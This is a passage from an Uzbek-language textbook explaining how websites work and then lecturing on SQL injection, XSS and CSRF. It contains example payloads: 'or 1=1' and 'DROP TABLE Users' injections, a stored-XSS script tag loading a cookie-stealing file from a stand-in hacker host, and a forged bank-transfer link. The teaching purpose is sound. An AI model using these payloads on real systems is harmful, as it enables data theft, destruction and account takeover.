Odatda, butun jarayon bir yoki ikki hafta davom etadi - bu saytning murakkabligi va dinamik sahifalar uchun server tomonida qayta ishlash zarurligiga bog‘liq. 
Ushbu bosqichlarning izchil bajarilishi web-saytingizni samarali, hammabop va tashrif buyuruvchilarni jalb qilishga tayyor bo‘lishini ta’minlaydi. Asos yaratib olingach, keyinchalik saytni yangilash, yangi sahifalar qo‘shish va dizaynni takomillashtirish ancha osonlashadi.
Web-sahifalar nima?
Web-sahifalar web-ishlab chiqish jarayonining muhim qismidir. Ular - web-saytni tashkil etuvchi alohida hujjatlardir. Har bir sahifa HTML kodida yozilgan bo‘lib, unda matn, rasmlar, videolar kabi turli kontent turlari aks ettiriladi.
Masalan, bosh sahifa kompaniya haqida umumiy ma’lumot berishi mumkin, mahsulot sahifasi esa mahsulotlarning tasnifi, tavsiflari va rasmlarini ko‘rsatadi.
Web-sahifaning elementlari CSS fayllari yordamida boshqariladi - ular sahifaning maketi, rang sxemasi va shriftlarini belgilaydi.
JavaScript esa interaktivlik qo‘shadi: animatsiyalar, ochiluvchi menyular, formalarni tekshirish va boshqa dinamik xususiyatlar. Bu komponentlar birgalikda web-sahifalarni funksional va estetik jihatdan jozibador qiladi.
Texnik tomondan izoh: web-sahifaning tuzilishi HTML orqali belgilanadi, tashqi ko‘rinishi CSS orqali bezatiladi. JavaScript fayllari esa interaktiv funksiyalarni boshqaradi va foydalanuvchilarga kontent bilan dinamik tarzda ishlash imkonini beradi. Ushbu fayllar serverdan yuklanadi va brauzerda ko‘rsatiladi.
Web-hostingning roli
Bugungi kunda har bir web-sayt internetda “yashay”digan joyga ehtiyoj sezadi. Ana shu jarayonda web-hosting xizmatlari ishga tushadi.
Web-hosting xizmati internetda web-sayt fayllarini saqlash va yetkazib berish uchun zarur bo‘lgan server joyi hamda texnologiyani taqdim etadi. Hosting bo‘lmasa, web-saytning sahifalariga internet orqali kirishning imkoni bo‘lmaydi.
“Web-saytlar qanday ishlaydi?” savoliga beriladigan har qanday aniq tushuntirish hostingsiz bo‘lishi mumkin emas, chunki aynan server web-saytning barcha fayllarini saqlaydi va foydalanuvchilarga taqdim etadi.
Web-sayt xosting qilinayotganda uning barcha fayllari - HTML kodi, CSS fayllari, JavaScript fayllari - server deb ataladigan fizik kompyuterda saqlanadi.
Foydalanuvchilar saytga kirganda, server sahifani yuklash uchun zarur bo‘lgan barcha resurslarni yetkazib beradi. Bu jarayon web-hosting provayderlari tomonidan boshqariladi - ular serverning doimo internetga ulangan va foydalanishga tayyor bo‘lishini ta’minlaydi.
Hosting xizmatlari turlari:
Shared hosting (umumiy hosting): bir nechta web-saytlar bitta server resurslaridan foydalanadi. Arzon, lekin cheklovlari bor - kichik saytlar uchun ideal. 
Dedicated hosting (ajratilgan hosting): bitta server faqat bitta saytga xizmat qiladi. Resurslar ko‘p, ishlash samaradorligi yuqori. Katta trafikga ega yirik saytlar uchun mos. 
Cloud hosting (bulutli hosting): web-sayt fayllari bir nechta serverlar majmuasida (bulut tarmog‘ida) saqlanadi. Bu yuqori kengayuvchanlik va doimiy ishlashni ta’minlaydi. Bir nechta mijozlar bilan ishlaydigan web-agentliklar uchun juda qulay, chunki u barqaror ishlashni kafolatlaydi. 
Texnik tomondan izoh: web-xosting web-sayt fayllarining 24/7 mavjud bo‘lishini ta’minlaydi. Server foydalanuvchi so‘rovlariga javob berib, brauzer sahifani ko‘rsatishi uchun zarur bo‘lgan HTML kod, rasmlar va boshqa resurslarni qaytaradi.
Web-saytlar qanday ishlaydi?
Web-saytlar qanday ishlashining asoslarini tushunish - ularning orqa fonida kechadigan murakkab jarayonlarni tushunish orqali amalga oshiriladi.
Foydalanuvchi brauzeriga web-sayt manzilini kiritganda, sahifa kontentini olish va ko‘rsatish uchun ketma-ket bir nechta jarayonlar ishga tushadi.
1. DNS so‘rovi
Foydalanuvchi domen nomini (masalan, www.tuit.uz) kiritganda, brauzer mos IP manzilni topish uchun DNS serveriga so‘rov yuboradi. DNS - domen nomini to‘g‘ri IP manzilga bog‘lab beradigan manzil kitobi vazifasini bajaradi.
2. Serverga ulanish
IP manzil aniqlangach, brauzer web-sahifani joylashtirgan serverga so‘rov yuboradi. Bu server web-saytni yuklash uchun zarur bo‘lgan barcha resurslarni saqlaydi: HTML kodi, CSS fayllari, JavaScript fayllari va boshqa kontent.
3. Web-sayt fayllarini olish
Server brauzer so‘roviga javoban sahifani shakllantirishga zarur bo‘lgan barcha fayllarni - HTML, CSS, rasmlar va boshqalarni - qaytaradi. Brauzer sahifani to‘g‘ri ko‘rsatishi uchun ushbu resurslar juda muhim.
4. Web-sahifani render qilish
Brauzer serverdan fayllarni olgach, HTML kodini qayta ishlaydi va sahifaning tuzilmasini yaratadi. So‘ng CSS fayllari yordamida sahifaga dizayn beriladi. JavaScript fayllari esa formalar, animatsiyalar, ochiluvchi oynalar kabi interaktiv funksiyalarni ishga tushiradi.
Texnik tomondan izoh: Bu jarayon bir necha komponentning hamkorligida amalga oshadi: Brauzer birinchi bo‘lib DNS serveriga murojaat qiladi. Keyin hosting serveriga ulanadi. Kerakli resurslarni yuklab oladi. Va sahifani foydalanuvchiga ko‘rsatadi. Bu jarayonlarning barchasi millisekundlar ichida sodir bo‘ladi, shuning uchun foydalanuvchi buni deyarli sezmaydi.
DNS server: Internetning telefon kitobi
Domen nomlari tizimi (DNS) - web-saytlarning eng muhim komponentlaridan biridir. Uning vazifasi inson o‘qiy oladigan domen nomlarini kompyuterlar o‘zaro muloqot qilishda ishlatadigan raqamli IP manzillarga aylantirishdir.
DNS bo‘lmasa, foydalanuvchilar oddiy domen nomlari o‘rniga murakkab IP manzillarni yodlab yurishlari kerak bo‘lardi. Shuning uchun DNS - web-saytlar texnik jihatdan qanday ishlashini tushunishda muhim bo‘g‘in bo‘lib, inson uchun qulay nomlarni mashina uchun tushunarli manzillarga “osonlik bilan” bog‘lovchi tizimdir.
DNS serveri foydalanuvchi kiritgan domen nomiga mos IP manzilni topguncha bir nechta serverlar orasida qidiruv olib boradi.
Bu jarayon bir necha bosqichdan iborat bo‘lib, DNS tizimi dunyo bo‘ylab tarqalgan ko‘plab serverlar orqali ishlaydi.
Texnik tomondan izoh: DNS bir nechta qatlamlardan tashkil topgan: root serverlar, TLD (Top-Level Domain) serverlari (masalan, .com, .uz, .org), avtoritativ DNS serverlari. Har bir qatlam brauzerni kerakli serverga yo‘naltiradi va sayt manzilining tez hamda aniq aniqlanishini ta’minlaydi.
Brauzerning web-saytlarni ko‘rsatishdagi roli
Brauzer serverdan javob ma’lumotlarini olgach, ularni qayta ishlashi va web-sahifani ko‘rsatishi kerak. Brauzer HTML kodini talqin qiladi va CSS hamda JavaScript fayllarida belgilangan ko‘rsatmalarga muvofiq sahifa elementlarini render qiladi.
HTMLni qayta ishlash (parsing): brauzer HTML kodini o‘qib, web-sahifaning tuzilmasini yaratadi - sarlavhalar, paragraflar, rasmlar va boshqa elementlarni aniqlaydi.
CSS orqali bezash (styling): brauzer CSS fayllarida berilgan uslublarni qo‘llab, sahifaning ko‘rinishini shakllantiradi: - maketi, ranglari, shriftlari va boshqa dizayn elementlarini belgilaydi.
JavaScriptni bajarish (execution): agar sahifada JavaScript mavjud bo‘lsa, brauzer bu skriptlarni bajaradi va ochiluvchi menyular, formalar, animatsiyalar kabi interaktiv funksiyalarni ishga tushiradi.
Texnik tomondan izoh: brauzer HTML va CSS fayllarini render qilish orqali ularni vizual ko‘rinishga aylantiradi. Bu jarayon foydalanuvchiga saytga kirganda to‘liq ishlaydigan, chiroyli va funksional sahifa ko‘rinishini beradi.
Dinamik va statik web-saytlar
Web-saytlar odatda foydalanuvchilarga kontentni qanday taqdim etishiga qarab statik yoki dinamik turga bo‘linadi.
Statik web-saytlar: bu turdagi saytlar har bir tashrif buyuruvchiga bir xil kontentni ko‘rsatadi. Sahifa kontenti oldindan yaratilgan bo‘ladi va serverda saqlanadi - ya’ni server tomonida qo‘shimcha skriptlar ishlashi talab qilinmaydi. Misol: oddiy portfolio sayti - unda rasm va matnlar barcha foydalanuvchilar uchun bir xil bo‘ladi.
Dinamik web-saytlar: bu saytlar foydalanuvchining harakati yoki real vaqt ma’lumotlariga qarab o‘zgaradigan kontent taqdim etadi. Server sahifani real vaqt rejimida yaratadi va ko‘pincha ma’lumotlar bazasidan ma’lumot oladi. Misol: eCommerce (internet-do‘kon) sayti - unda foydalanuvchining oldingi xaridlariga qarab turli mahsulot tavsiyalari ko‘rsatiladi.
Texnik tomondan izoh: dinamik web-saytlar server tomonida ishlaydigan PHP, Python, Node.js kabi dasturlash tillaridan foydalanadi va sahifa kontentini real vaqt rejimida shakllantiradi. Bunday saytlar odatda foydalanuvchi tajribasini moslashtirish uchun zarur bo‘lgan ma’lumotlarni saqlash va chaqirishda ma’lumotlar bazasiga tayanadi.
Web-dasturchilar va ularning web-sayt yaratishdagi roli
Bugungi kunda web-dasturchilar web-saytlarni yaratish va ularni doimiy ravishda qo‘llab-quvvatlash uchun mas’ul hisoblanadi. Ular saytning front-end (foydalanuvchi ko‘radigan qismi) va back-end (server, ma’lumotlar bazasi va ilova mantig‘i) qismlarida ishlaydi.
Ularning vazifasi - web-sahifalar funksional, chiroyli va foydalanuvchi uchun qulay bo‘lishini ta’minlash.
Front-end ishlab chiqish: front-end dasturchilar web-saytning foydalanuvchiga ko‘rinadigan qismiga e’tibor qaratadi. Ular HTML, CSS va JavaScript yordamida interaktiv va jozibador sahifalar yaratadi. Misol: front-end dasturchi saytning navigatsiya menyusi kompyuterda ham, mobil qurilmada ham bir xil ishlashini ta’minlaydi.
Back-end ishlab chiqish: back-end dasturchilar saytning server tomonini boshqaradi: server so‘rovlarni qanday qayta ishlashi, ma’lumotlar bazasidan ma’lumotni qanday olishini, xavfsizlikni qanday ta’minlashini hal qiladi. Misol: back-end dasturchi foydalanuvchi forma yuborganida ularning ma’lumotlari xavfsiz tarzda qayta ishlanishi va ma’lumotlar bazasiga saqlanishini ta’minlaydi.
Texnik tomondan izoh: front-end ishlab chiqish - bu foydalanuvchi interfeysini yaratish jarayoni. Back-end ishlab chiqish esa server, ma’lumotlar bazasi va dastur mantig‘ini boshqaradi. Ikki tomon birgalikda ishlaganda, web-sayt to‘liq va muammosiz faoliyat yuritadi.
Web-sayt funksionalligida APIlarning roli
Ko‘plab zamonaviy web-saytlar turli xizmatlar va funksiyalarni ulash uchun APIlardan (Application Programming Interface) foydalanadi. API - bir tizimning boshqasiga murojaat qilishi va u bilan muloqot qilishi uchun imkon beradigan interfeys bo‘lib, web-saytlarga tashqi manbalardan ma’lumot olish yoki uchinchi tomon xizmatlarini integratsiya qilish imkoniyatini yaratadi. 
Misol: ob-havo sayti API yordamida uchinchi tomon provayderidan real vaqt ob-havo ma’lumotlarini olib, bosh sahifada ko‘rsatishi mumkin.
Texnik tomondan izoh: APIlar web-saytlarga boshqa tizimlardan ma’lumot so‘rash va uni qabul qilish imkonini beradi. Bu esa dinamik kontentning har doim yangilanib turishini va foydalanuvchi uchun dolzarb bo‘lishini ta’minlaydi.
Web-saytlar foydalanuvchi ma’lumotlarini qanday qayta ishlaydi?
Foydalanuvchilar web-saytlar bilan o‘zaro aloqada bo‘ladi va ko‘pincha login ma’lumotlari, yetkazib berish manzillari yoki to‘lov ma’lumotlari kabi shaxsiy ma’lumotlarni kiritadi. Web-saytlar bu ma’lumotlarni maxfiylikni himoya qilish va ruxsatsiz foydalanishning oldini olish uchun xavfsiz tarzda qayta ishlashi kerak.
Web-saytlar brauzer va server orasida uzatiladigan ma’lumotlarni shifrlash uchun HTTPS kabi xavfsiz ulanishlardan foydalanadi. Bundan tashqari, ko‘plab saytlar foydalanuvchi ma’lumotlarini ma’lumotlar bazalarida saqlaydi - bunda ma’lumotlar xavfsiz tarzda qayta ishlanishi va zarurat tug‘ilganda ishonchli ravishda qayta chaqirilishi ta’minlanadi. Agar siz login, to‘lov tizimi yoki boshqa muhim ma’lumotlarni qayta ishlaydigan sayt qismini boshqarsangiz, bu amaliyotlar juda muhimdir. 
Texnik tomondan izoh: web-saytlar foydalanuvchi ma’lumotlarini uzatish vaqtida himoya qilish uchun SSL/TLS kabi shifrlash protokollaridan foydalanadi. Shuningdek, server tomonida ma’lumotlarni tekshirish (validation) va ma’lumotlar bazasini himoya qilish choralarini qo‘llash orqali foydalanuvchi ma’lumotlari buzilishining oldi olinadi.
Mijoz-server arxitekturasi
Mijoz-server modeli - bu taqsimlangan arxitektura bo‘lib, unda mijozlar xizmatlarni so‘raydi, serverlar esa ularni taqdim etadi. U zamonaviy tizimlarning aksariyati - web-saytlar, elektron pochta xizmatlari, bulutli saqlash platformalari - uchun asos bo‘lib xizmat qiladi (5.1-rasm).

5.1-rasm. Mijoz-server arxitekturasi
Mijoz-server arxitekturasi qanday ishlaydi?
Mijoz (Client): mijoz - bu ma’lumot yoki xizmat so‘rab, serverga murojaatni boshlaydigan qurilma yoki dastur. Keng tarqalgan mijoz ilovalari: web-brauzerlar (masalan, Chrome, Firefox), elektron pochta ilovalari (masalan, Gmail, Outlook).
Server: server - bu kuchli tizim bo‘lib, mijoz so‘rovlarini qabul qiladi va ularga javob qaytaradi. Serverlar ko‘pincha bir vaqtning o‘zida bir nechta mijoz so‘rovlarini qayta ishlay oladi. Keng tarqalgan server turlari: web-serverlar (masalan, Apache, Nginx), elektron pochta serverlari, ma’lumotlar bazasi serverlari.
Web-saytni brauzer orqali ochishda DNS qanday rol o‘ynaydi? Jarayonni ketma-ket bosqichlarda tushuntiring.
	•	Mijoz (client) va server o‘rtasidagi farq nimada? Ularning asosiy vazifalarini misollar bilan izohlang.
	•	Statik va dinamik web-saytlar o‘rtasidagi asosiy farqlar nimada? Har ikkisiga amaliy misol keltiring.
	•	Web-sahifa brauzerda qanday render qilinadi? HTML, CSS va JavaScriptning ahamiyatini tushuntiring.
	•	 API nima va u web-saytda qanday ishlatiladi? Kamida bitta real hayotiy misol keltiring.
	•	Web-hostingning asosiy vazifasi nimadan iborat? Hosting bo‘lmasa, foydalanuvchi nega saytga kira olmaydi?
	•	Web-saytlar foydalanuvchi ma’lumotlarini qanday himoya qiladi? HTTPS, SSL/TLS va ma’lumotlar bazasi xavfsizligi haqida izoh bering.
	•	Brauzer so‘rov yuborganidan boshlab sahifa ko‘rilguncha bo‘lgan to‘liq jarayonni (DNS → serverga ulanish → fayllarni olish → render qilish) tushuntirib bering.
Nazorat savollari
	•	Web-saytni brauzer orqali ochishda DNS qanday rol o‘ynaydi? Jarayonni ketma-ket bosqichlarda tushuntiring.
	•	Mijoz (client) va server o‘rtasidagi farq nimada? Ularning asosiy vazifalarini misollar bilan izohlang.
	•	Statik va dinamik web-saytlar o‘rtasidagi asosiy farqlar nimada? Har ikkisiga amaliy misol keltiring.
	•	Web-sahifa brauzerda qanday render qilinadi? HTML, CSS va JavaScriptning ahamiyatini tushuntiring.
	•	 API nima va u web-saytda qanday ishlatiladi? Kamida bitta real hayotiy misol keltiring.
	•	Web-hostingning asosiy vazifasi nimadan iborat? Hosting bo‘lmasa, foydalanuvchi nega saytga kira olmaydi?
	•	Web-saytlar foydalanuvchi ma’lumotlarini qanday himoya qiladi? HTTPS, SSL/TLS va ma’lumotlar bazasi xavfsizligi haqida izoh bering.
	•	Brauzer so‘rov yuborganidan boshlab sahifa ko‘rilguncha bo‘lgan to‘liq jarayonni (DNS → serverga ulanish → fayllarni olish → render qilish) tushuntirib bering.
Nazorat savollari

5.2. Keng tarqalgan web zaifliklar  (Ma’ruza mashg‘uloti)
1. SQL inyeksiya zaifligi.
2. XSS zaifligi.
3. CSRF zaifligi.
4. Obro‘sizlantirilgan autentifikatsiya zaifligi.
Reja:
1. SQL inyeksiya zaifligi.
2. XSS zaifligi.
3. CSRF zaifligi.
4. Obro‘sizlantirilgan autentifikatsiya zaifligi.
Reja:

SQL inyeksiya, saytlararo skriptlash (XSS), saqlangan XSS, aks ettirilgan XSS, saytlararo so‘rov soxtalashtirish (CSRF), autentifikatsiya, avtorizatsiya, obro‘sizlantirilgan autentifikatsiya, kuchsiz parol siyosati.
Kalit so‘zlar:
SQL inyeksiya, saytlararo skriptlash (XSS), saqlangan XSS, aks ettirilgan XSS, saytlararo so‘rov soxtalashtirish (CSRF), autentifikatsiya, avtorizatsiya, obro‘sizlantirilgan autentifikatsiya, kuchsiz parol siyosati.
Kalit so‘zlar:
SQL inyeksiya zaifligi
SQL inyeksiya (SQL injection, SQLI) nima?
SQL inyeksiya, qisqacha SQLI, bu server tomondagi (backend) ma’lumotlar bazasini o‘zgartirish uchun zararli SQL kodidan foydalaniladigan keng tarqalgan hujum turidir. Ushbu hujum orqali dastlab ko‘rsatish uchun mo‘ljallanmagan ma’lumotlardan foydalanish mumkin bo‘ladi. Bu ma’lumotlar kompaniyaning maxfiy ma’lumotlari, foydalanuvchilar ro‘yxati yoki mijozlarning shaxsiy ma’lumotlari bo‘lishi mumkin.
SQL inyeksiyaning biznesga ta’siri juda katta bo‘lishi mumkin. Muvaffaqiyatli hujum natijasida foydalanuvchilar ro‘yxatining ruxsatsiz ko‘rilishi, butun jadvallarning o‘chirilishi yoki ayrim holatlarda hujumchining ma’lumotlar bazasiga administrator huquqlarini qo‘lga kiritishi kabi zararli oqibatlar yuz berishi mumkin. Bu esa biznes uchun juda jiddiy tahdiddir.
SQLI yuzasidan zarar miqdorini baholashda telefon raqamlari, manzillar, kredit karta ma’lumotlari kabi shaxsiy ma’lumotlar o‘g‘irlangan taqdirda mijozlar ishonchining yo‘qolishi bilan bog‘liq zararlarni ham inobatga olish zarur.
Bu hujum turi har qanday SQL ma’lumotlar bazasiga qarshi qo‘llanishi mumkin bo‘lsada, eng ko‘p nishonga olinadigan obyektlar - bu web-saytlar hisoblanadi.

SQL so‘rovlari (SQL queries) nima?
SQL - bu ma’lumotlar bazalariga murojaat qilish va ularni boshqarish uchun standartlashtirilgan til bo‘lib, foydalanuvchilar uchun moslashtirilgan ma’lumot ko‘rinishlarini yaratishda qo‘llaniladi. SQL so‘rovlari ma’lumotlarni olish, yangilash, yozuvlarni o‘chirish kabi buyruqlarni bajarishda ishlatiladi. Turli SQL elementlari bu vazifalarni bajaradi, masalan, foydalanuvchi tomonidan berilgan parametrlar asosida ma’lumot olish uchun SELECT operatoridan foydalaniladigan so‘rovlar ishlatiladi.
Sodda internet-do‘konning SQL ma’lumotlar bazasiga yuboriladigan so‘rovi quyidagicha bo‘lishi mumkin:
SELECT ItemName, ItemDescription
FROM Item
WHERE ItemNumber = ItemNumber
Web-ilova bundan foydalanib ma’lumotlar bazasiga yuboriladigan bitta SQL operatori ko‘rinishidagi satrli so‘rovni yaratadi:
sql_query = "
SELECT ItemName, ItemDescription
FROM Item
WHERE ItemNumber = " & Request.QueryString("ItemID")
Foydalanuvchi kiritgan http://www.estore.com/items/items.asp?itemid=999 manzil quyidagi SQL so‘rovini hosil qiladi:
SELECT ItemName, ItemDescription
FROM Item
WHERE ItemNumber = 999
Sintaksisdan ko‘rinib turibdiki, ushbu so‘rov 999-raqamli mahsulotning nomi va tavsifini qaytaradi.
SQL inyeksiyalar turlari
SQL inyeksiyalari odatda uchta asosiy toifaga bo‘linadi: In-band SQLi (klassik), Inferential SQLi (ko‘r-ko‘rona yoki blind) va Out-of-band SQLi. SQL inyeksiyalari turlari server tomon (backend) ma’lumotlariga kirish usuli va yetkazishi mumkin bo‘lgan zarar darajasiga ko‘ra tasniflanadi.
1. In-band SQLi
Hujumchi bir xil kommunikatsiya kanalidan ham hujumni amalga oshirish, ham natijalarni olish uchun foydalanadi. Soddaligi va samaradorligi sababli in-band SQLi - eng keng tarqalgan SQL hujumi turidir. Ushbu usul ikki kichik turga bo‘linadi:
• Error-based SQLi: hujumchi ma’lumotlar bazasida xatolik xabarlarini yuzaga keltiradigan amallarni bajaradi. Ushbu xatolik xabarlari orqali hujumchi bazaning tuzilmasi haqida ma’lumot olishi mumkin.
• Union-based SQLi: bu usul UNION operatoridan foydalanadi. UNION bir nechta SELECT so‘rovlarini bitta javobga birlashtiradi. Olingan HTTP javobda hujumchi foydalanishi mumkin bo‘lgan ma’lumotlar bo‘lishi mumkin.
2. Inferential (Blind) SQLi - Ko‘r-ko‘rona SQL inyeksiya: 
Hujumchi serverga ma’lumot yuklamalarini yuborib, serverning javobi va xatti-harakatiga qarab uning tuzilmasi haqida ma’lumot to‘playdi. Bunga “ko‘r-ko‘rona” SQLi deyiladi, chunki ma’lumotlar bazasidagi ma’lumotlar bevosita hujumchiga qaytarilmaydi, ya’ni ular natijalarni to‘g‘ridan-to‘g‘ri ko‘ra olmaydi.
Blind SQL inyeksiyalar server javoblarining turlicha bo‘lishiga asoslanadi, shuning uchun ular sekinroq, ammo shunga qaramay juda xavfli bo‘lishi mumkin. Blind SQLi ikki turga bo‘linadi:
• Boolean-based Blind SQLi: hujumchi ma’lumotlar bazasiga SQL so‘rovini yuboradi. So‘rovning javobi true yoki false bo‘lishiga qarab web-ilovaning javobi o‘zgaradi yoki o‘zgarmaydi. Hujumchi shu orqali so‘rovning to‘g‘ri yoki noto‘g‘ri ekanini bilib oladi.
• Time-based Blind SQLi: hujumchi ma’lumotlar bazasiga ma’lum vaqt (sekundlarda) kutishni talab qiladigan SQL so‘rovi yuboradi. Agar server javobi kechiksa - shart true, agar darhol javob qaytsa - false deb hisoblanadi. Shunday qilib, hujumchi ma’lumotlarsiz ham so‘rov natijasini bilib oladi.
3. Out-of-band SQLi
Bu turdagi hujum faqat web-ilova ishlatayotgan ma’lumotlar bazasi serverida ma’lum funksiyalar yoqilgan bo‘lsa amalga oshirilishi mumkin. Ushbu usul asosan in-band va blind SQLi usullari ishlamagan hollarda qo‘llanadi.
Out-of-band SQLi hujumchi hujumni boshlash va ma’lumot olish uchun bir xil kanalni ishlata olmaganida yoki server juda sekin yoki beqaror bo‘lganida qo‘llanadi. Bu usul serverning DNS yoki HTTP so‘rovlarini yarata olish qobiliyatiga tayanadi, ya’ni hujum natijalari boshqa kanal orqali hujumchiga uzatiladi.
SQL inyeksiyaga misollar
SQL inyeksiyani amalga oshirmoqchi bo‘lgan hujumchi bazada mavjud bo‘lgan tekshirilmagan (validatsiya qilinmagan) kirish ma’lumotlari zaifliklaridan foydalanish uchun oddiy SQL so‘rovini o‘zgartiradi. Ushbu hujum vektorini bajarishning ko‘plab usullari mavjud, quyida esa SQLI qanday ishlashini tushunishga yordam beruvchi asosiy misollar keltiriladi.
1. Oddiy so‘rovni o‘zgartirish orqali barcha yozuvlarni olish
Yuqorida mahsulot haqida ma’lumot olish uchun ishlatilgan quyidagi manzil keltirilgan edi: http://www.estore.com/items/items.asp?itemid=999 
Hujumchi uni quyidagicha o‘zgartirishi mumkin:
http://www.estore.com/items/items.asp?itemid=999 or 1=1 
Natijada SQL so‘rovi quyidagi ko‘rinishni oladi:
SELECT ItemName, ItemDescription
FROM Items
WHERE ItemNumber = 999 OR 1=1
1=1 har doim rost (true) bo‘lgani uchun, so‘rov ma’lumotlar bazasidagi barcha mahsulotlarning nomi va tavsifini qaytaradi - hatto foydalanuvchi kirish huquqiga ega bo‘lmagan ma’lumotlarni ham.
2. Noto‘g‘ri filtrlash oqibatida SQL buyruqlarni buzish
Hujumchi ayrim belgilar noto‘g‘ri filtrlansa, masalan, nuqtali vergul (;) orqali ikki alohida SQL buyruqlarini ajratib, qo‘shimcha buyruq bajarishga majbur qilishi mumkin.

Misol:
http://www.estore.com/items/items.asp?itemid=999; DROP TABLE Users
Hosil bo‘lgan SQL so‘rovi:
SELECT ItemName, ItemDescription
FROM Items
WHERE ItemNumber = 999; DROP TABLE USERS
Natijada butun Users jadvali o‘chib ketishi mumkin, bu juda xavfli oqibatga olib keladi.
XSS zaifligi
Cross Site Scripting (XSS) - bu zaif web-ilovaga zararli kod (odatda JavaScript) kiritish orqali amalga oshiriladigan keng tarqalgan hujum vektori. XSS, masalan SQL injeksiyalaridan farqli o‘laroq, ilovaning o‘zini emas, balki web-ilovadan foydalanuvchilarni nishonga oladi.
Muvaffaqiyatli XSS hujumi onlayn biznesning obro‘siga, mijozlari bilan bo‘lgan ishonchiga jiddiy zarar yetkazishi mumkin.
Hujumning darajasiga qarab, quyidagi oqibatlar yuz berishi mumkin:
	•	foydalanuvchi akkauntlari buzib kirilishi;
	•	trojan dasturlar ishga tushirilishi;
	•	sahifa kontenti o‘zgartirilishi va foydalanuvchilarni aldab maxfiy ma’lumotlarini o‘zlari topshirishga majbur qilish;
	•	sessiya kukilarini qo‘lga kiritilishi va ularning yordamida hujumchi haqiqiy foydalanuvchi sifatida tizimdan foydalanishi.
XSS hujumlarining turlari
Cross site scripting hujumlarining ikki asosiy turi mavjud: saqlangan (stored) va aks ettirilgan (reflected) XSS.
1. Stored XSS (doimiy XSS)
Bu ikki tur ichida eng xavflisidir. Zararli skript to‘g‘ridan-to‘g‘ri zaif web-ilova ichiga kiritiladi va serverda saqlanadi. Masalan, sharhlar (comment) bo‘limida qoldirilgan zararli skript har bir sahifa yuklanishida avtomatik ishga tushadi  (5.2-rasm).
2. Reflected XSS
Bu turdagi XSSda zararli skript foydalanuvchiga link orqali yuboriladi. Skript web-ilovadan “aks ettirilib”, foydalanuvchining brauzerida bajariladi. Skript faqat foydalanuvchi yuborilgan linkni bosganda ishga tushadi.
Stored Cross Site Scripting (Saqlangan XSS) nima?
Saqlangan XSS hujumini muvaffaqiyatli amalga oshirish uchun hujumchi avvalo web-ilovadagi zaiflikni topishi, so‘ngra zararli skriptni serverga joylashtirishi kerak (masalan, sharh qoldirish maydoni orqali).

5.2-rasm. Saqlangan XSS hujumining amalga oshirilishi
Eng ko‘p nishonga olinadigan saytlar - foydalanuvchilar kontent joylashtirishi mumkin bo‘lgan platformalar: bloglar, ijtimoiy tarmoqlar, video ulashish servislari va forumlar. Har safar zararlangan sahifa ko‘rilganda, zararli skript avtomatik ravishda qurbonning brauzeriga yuboriladi va ishga tushadi.
Stored XSS (saqlangan XSS) hujumiga misol
Elektron savdo (e-commerce) saytini ko‘zdan kechirayotgan hujumchi kommentariyalar bo‘limiga HTML teglarini joylashtirish imkonini beruvchi zaiflikni aniqlaydi. Ushbu HTML teglar sahifaning doimiy qismiga aylanadi va har safar sahifa ochilganda brauzer ularni asosiy kod bilan birga qayta ishlaydi.
Hujumchi quyidagi kommentariyani qoldiradi:
Ajoyib buyum uchun ajoyib narx! Mening sharhimni bu yerda o‘qing <script src="http://hackersite.com/authstealer.js"></script>.
Shundan boshlab, har safar sahifa ochilganda, kommentariyadagi HTML tegi boshqa saytga joylashtirilgan JavaScript faylini ishga tushiradi. Bu skript tashrif buyuruvchilarning sessiya kukilarini o‘g‘irlash imkoniga ega.
Sessiya kukisidan foydalangan holda, hujumchi tashrif buyuruvchining akkauntini buzib kirishi, shaxsiy ma’lumotlari va kredit karta ma’lumotlaridan osongina foydalanish imkoniga ega bo‘ladi. Shu bilan birga, tashrif buyuruvchi kommentariyalar bo‘limiga hatto pastga ham tushmagan bo‘lishi mumkin va hujum sodir bo‘lganini umuman sezmaydi.
Reflected XSS hujumidan farqli ravishda, bu turdagi hujumda skriptning ishga tushishi uchun foydalanuvchining linkni bosishi shart emas - zararlangan sahifaga tashrif buyurishning o‘zi kifoya. Bu esa hujum ko‘lamini kengaytiradi va barcha tashrif buyuruvchilarni, ularning ehtiyotkorlik darajasidan qat’i nazar, xavf ostiga qo‘yadi.
Hujumchi nuqtai nazaridan, yuqori trafikga ega bo‘lgan va doimiy skript joylashtirish imkonini beradigan zaif web-saytni topish har doim ham oson emasligi bois, persistent (saqlangan) XSS hujumini amalga oshirish biroz qiyinroq.
CSRF zaifligi
Cross Site Request Forgery (CSRF), shuningdek XSRF, Sea Surf yoki Session Riding nomlari bilan ham tanilgan, foydalanuvchi tizimga kirgan ilovada bajarilishini istamagan amalni brauzer orqali majburan bajarishga majbur qiladigan hujum vektori hisoblanadi (5.3-rasm).
Muvaffaqiyatli CSRF hujumi ham biznes, ham foydalanuvchi uchun juda xavfli oqibatlarga olib kelishi mumkin. Bunga quyidagilar kiradi:
	•	mijozlar bilan munosabatlarning buzilishi;
	•	ruxsatsiz pul o‘tkazmalari;
	•	parollarni o‘zgartirib yuborish;
	•	ma’lumotlarning o‘g‘irlanishi, shu jumladan sessiya kukilarining qo‘lga kiritilishi.
CSRF hujumlari odatda ijtimoiy muhandislik (social engineering) orqali amalga oshiriladi. Masalan, qurbonni aldab, uni zararli emaildagi havolani bosishga yoki soxtalashtirilgan so‘rov yuborishga majbur qilish orqali.
Hujum sodir bo‘lgan paytda foydalanuvchi tizimga allaqachon autentifikatsiya qilingan bo‘lgani uchun, server uchun haqiqiy so‘rovni soxtasidan ajratishning imkoni bo‘lmaydi.

5.3-rasm. CSRF hujumining amalga oshirilishi
CSRF hujumiga misol
Hujumni amalga oshirishdan oldin, hujumchi odatda ilovani o‘rganib chiqadi, shunda u yaratadigan soxta so‘rov iloji boricha haqiqiy ko‘rinishda bo‘ladi.
Masalan, $100 miqdoridagi bank o‘tkazmasi uchun oddiy GET so‘rovi quyidagicha bo‘lishi mumkin:
GET http://netbank.com/transfer.do?acct=PersonB&amount=$100 HTTP/1.1
Hacker bu skriptni o‘zgartirib, $100 ni o‘z hisobiga o‘tkazadigan ko‘rinishga keltirishi mumkin. Endi zararli so‘rov quyidagicha ko‘rinadi:
GET http://netbank.com/transfer.do?acct=AttackerA&amount=$100 HTTP/1.1
Yomon niyatli shaxs ushbu so‘rovni oddiy ko‘rinadigan hyperlink ichiga joylashtirishi mumkin:
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>
